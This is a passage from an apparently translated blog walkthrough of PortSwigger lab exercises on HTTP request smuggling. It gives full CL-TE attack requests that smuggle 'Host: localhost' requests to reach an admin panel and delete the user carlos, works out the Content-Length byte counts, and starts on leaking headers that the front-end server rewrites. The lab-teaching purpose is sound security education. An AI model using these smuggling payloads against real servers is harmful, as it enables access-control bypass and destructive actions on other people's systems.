himj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/http-smuggling/20200520138223.png" alt=""></p><p>You can see that the second request we got the response of <code>/admin</code></p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"container is-page"</span>&gt;</span></span><br><span class="line">  Admin interface only available if logged in as an administrator, or if requested as localhost</span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>So we add the HOST header and send it again a few times</p><p></p><figure class="highlight http hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: ac211ffb1eae617180910ebc00fc00f4.web-security-academy.net</span><br><span class="line"><span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0</span><br><span class="line"><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="hljs-attribute">Connection</span>: close</span><br><span class="line"><span class="hljs-attribute">Cookie</span>: session=KmHiNQ45l7kqzLTPM6uBMpcgm8uesd5a</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 45</span><br><span class="line"><span class="hljs-attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"></span><br><span class="line"><span class="hljs-attribute">0</span></span><br><span class="line"><span class="hljs-attribute"></span></span><br><span class="line">GET /admin HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: localhost</span><br></pre></td></tr></tbody></table></figure><p></p><p>We can see that the content of the <code>/admin</code> panel. If it dosen’t work, you can send it a few times.</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/http-smuggling/20200520139301.png" alt=""></p><p>We got the deleted api, so we can use HTTP Smuggling to access this <code>/admin/delete?username=carlos</code>, and construct the following data packet.</p><p></p><figure class="highlight http hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: ac211ffb1eae617180910ebc00fc00f4.web-security-academy.net</span><br><span class="line"><span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0</span><br><span class="line"><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="hljs-attribute">Connection</span>: close</span><br><span class="line"><span class="hljs-attribute">Cookie</span>: session=KmHiNQ45l7kqzLTPM6uBMpcgm8uesd5a</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 63</span><br><span class="line"><span class="hljs-attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"></span><br><span class="line"><span class="hljs-attribute">0</span></span><br><span class="line"><span class="hljs-attribute"></span></span><br><span class="line">GET /admin/delete?username=carlos HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: localhost</span><br></pre></td></tr></tbody></table></figure><p></p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/http-smuggling/20200520130304.png" alt=""></p><p>This attack method is similar to HTTP SSRF. The main point is to control the value of CL. For example, the value of CL in the first packet is 28, which is calculated as follows:</p><p></p><figure class="highlight angelscript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-number">0</span>\r\n--&gt; <span class="hljs-number">3</span> bytes</span><br><span class="line">\r\n--&gt; <span class="hljs-number">2</span> bytes</span><br><span class="line">GET /admin HTTP/<span class="hljs-number">1.1</span>\r\n--&gt; <span class="hljs-number">19</span>+<span class="hljs-number">2</span> = <span class="hljs-number">21</span> bytes</span><br><span class="line">\r\n--&gt; <span class="hljs-number">2</span> bytes</span><br></pre></td></tr></tbody></table></figure><p></p><p>So it is  3+2+21+2 = 28 bytes in total.</p><p>The situation of TE-CL is similar, so the example will not be repeated here.</p><h3 id="Revealing-Front-end-Request-Rewriting"><a href="#Revealing-Front-end-Request-Rewriting" class="headerlink" title="Revealing Front-end Request Rewriting"></a>Revealing Front-end Request Rewriting</h3><blockquote><pre><code>In some network environments, the front-end proxy server does not forward the request directly to the back-end server after receiving the request. Instead, it adds some necessary fields and then forwards it to the back-end server. These fields are required by the backend server to process the request, such as:- Describe the protocol name and password used by the TLS connection- XFF header containing the user's IP address- User's session token IDIn short, if we can't get the fields added or rewritten by the proxy server, our smuggled past requests can't be processed correctly by the backend server. So how do we get these values? PortSwigger provides a very simple method, mainly in three major steps:- Find a POST request that can output the value of the request parameter to the response- Put the special parameter found in the POST request at the end of the message.- Then smuggle this request and then send a normal request directly, and some fields that the front-end server rewrites for this request will be displayed.</code></pre></blockquote><p>Sometimes the Front server adds some request headers to the forwarded request and forwards them to the Backend server. We can use HTTP Smuggling to leak these request headers. We also use LAB to understand. <a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting" target="_blank" rel="noopener">Lab: Exploiting HTTP request smuggling to reveal front-end request rewriting</a></p><blockquote><p>This lab involves a front-end and back-end server, and the front-end server doesn’t support chunked encoding.</p><p>There’s an admin panel at /admin, but it’s only accessible to people with the IP address 127.0.0.1. The front-end server adds an HTTP header to incoming requests containing their IP address. It’s similar to the X-Forwarded-For header but has a different name.</p><p>To solve the lab, smuggle a request to the back-end server that reveals the header that is added by the front-end server. Then smuggle a request to the back-end server that includes the added header, accesses the admin panel, and deletes the user carlos.</p></blockquote><p>According to the title hint here, the scene is a CL-TE scene and a search box is given. We try to search for a 123 at will. We can find that the search result “123” is directly echoed into the corresponding one.</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/http-smuggling/20200520137721.png" alt=""></p><p>Attempted access using HTTP Smuggling, but was blocked.</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/http-smuggling/20200520130471.png" alt=""></p><p>But we can try to use the search echo to leak the request header forwarded by the Front server:</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/http-smuggling/20200520136832.png" alt=""></p><p>If you only add the X-*-Ip request header later, you cannot access the admin panel, because this will make Backend receive two duplicate request headers. In this scenario, the Backend server judges the duplicate request headers.</p><p><img 